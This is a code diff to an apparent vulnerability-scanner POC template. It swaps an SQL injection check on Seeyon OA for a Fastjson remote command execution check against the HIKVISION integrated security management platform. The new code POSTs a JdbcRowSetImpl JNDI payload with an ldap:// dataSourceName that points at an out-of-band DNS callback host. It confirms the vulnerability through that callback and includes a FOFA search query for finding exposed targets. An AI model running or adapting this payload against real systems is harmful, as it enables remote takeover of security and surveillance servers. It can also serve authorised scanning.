@@ -1,6 +1,6 @@
 # coding:utf-8  
 import requests
-from lib.core.common import url_handle,get_random_ua
+from lib.core.common import url_handle,get_random_ua,get_ceye_dns,verify_ceye_dns
 from lib.core.poc import POCBase
 # ...
 import urllib3
@@ -17,17 +17,19 @@ class POC(POCBase):
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "致远OA A6 test.jsp SQL注入漏洞",                        # 漏洞名称
+        "name" : "HIKVISION 综合安防管理平台 applyCT Fastjson远程命令执行漏洞",                        # 漏洞名称
         "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "致远OA",                     # 漏洞应用名称
+        "AppName" : "HIKVISION 综合安防管理平台",                     # 漏洞应用名称
         "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            致远OA A6-m等业务系统test.jsp处存在SQL注入漏洞，攻击者通过漏洞可以写入网站木马，导致服务器失陷。
+            海康威视综合安防管理平台,可以对接入的视频监控点集中管理,实现统一部署、统一配置、统一管理和统一调度。
+            海康威视综合安防管理平台存在Fastjson远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限。
+            参考：https://mp.weixin.qq.com/s/EM4iBEGcdDvNUOyfO9lK1w
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="致远互联-OA"
+            app="HIKVISION-综合安防管理平台"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -42,23 +44,33 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)" # url自己按需调整
-        
+        url = self.target + "/bic/ssoService/v1/applyCT" # url自己按需调整
+
+        success, dns_flag = get_ceye_dns()
+        if success == False:
+            return [False, dns_flag]
+
+        data = """{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://%s","autoCommit":true},"hfe4zyyzldp":"="}"""%(dns_flag)
+
         headers = {
                     "User-Agent":get_random_ua(),
                     "Connection":"close",
-                    # "Content-Type": "application/x-www-form-urlencoded",
+                    "Content-Type": "application/json",
                     }
         
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "<td>@@basedir" in req.text and req.status_code == 200 :
-                vuln = [True,req.text]
+            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+
+            flager = verify_ceye_dns(dns_flag)
+            if flager == True:
+                vuln = [True, dns_flag]
+            elif flager == False:
+                vuln = [False, dns_flag]
             else:
-                vuln = [False,req.text]
+                vuln = [False, flager]
         except Exception as e:
             raise e
         
